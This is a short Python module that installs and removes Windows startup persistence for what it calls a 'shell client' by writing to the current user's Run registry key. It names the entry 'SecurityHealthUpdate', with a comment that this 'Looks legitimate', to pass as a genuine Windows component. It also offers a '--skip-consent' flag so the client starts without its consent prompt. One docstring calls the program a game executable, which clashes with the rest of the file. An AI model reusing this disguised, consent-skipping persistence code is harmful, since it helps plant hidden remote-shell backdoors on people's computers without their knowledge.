"""
Windows persistence installer - adds shell client to Registry run key.
Phase 2: Automatic startup after system restart.
"""

import sys
from pathlib import Path
from typing import Tuple

if sys.platform != "win32":
    # No-op on non-Windows platforms
    def install_persistence(exe_path: str) -> Tuple[bool, str]:
        return True, "Persistence not supported (non-Windows)"
    
    def remove_persistence() -> Tuple[bool, str]:
        return True, "Persistence not supported (non-Windows)"

else:
    # Windows only
    try:
        import winreg
        HAS_WINREG = True
    except ImportError:
        HAS_WINREG = False

    def install_persistence(exe_path: str, skip_consent: bool = False) -> Tuple[bool, str]:
        """
        Add game exe to Windows Registry run key.
        Makes it auto-start after user login (Phase 2).
        
        Args:
            exe_path: Path to executable to run at startup
            skip_consent: If True, append flag to skip consent prompt
        """
        if not HAS_WINREG:
            return False, "winreg module not available"
        
        try:
            path = Path(exe_path)
            if not path.exists():
                return False, f"Executable not found: {exe_path}"
            
            # Build command: exe path + optional skip-consent flag
            cmd = str(exe_path)
            if skip_consent:
                cmd = f'"{exe_path}" --skip-consent'
            
            # Open registry key HKEY_CURRENT_USER\...\Run
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Add entry with disguised name
            winreg.SetValueEx(
                key,
                "SecurityHealthUpdate",  # Looks legitimate
                0,
                winreg.REG_SZ,
                cmd
            )
            
            winreg.CloseKey(key)
            return True, f"Persistence enabled (auto-start on login)"
        
        except Exception as e:
            return False, f"Persistence install failed: {e}"

    def remove_persistence() -> Tuple[bool, str]:
        """
        Remove shell client from Windows Registry run key.
        """
        if not HAS_WINREG:
            return False, "winreg module not available"
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            try:
                winreg.DeleteValue(key, "SecurityHealthUpdate")
                status = True
                msg = "Persistence removed from registry"
            except FileNotFoundError:
                status = True
                msg = "Persistence not found (already removed)"
            
            winreg.CloseKey(key)
            return status, msg
        
        except Exception as e:
            return False, f"Persistence removal failed: {e}"

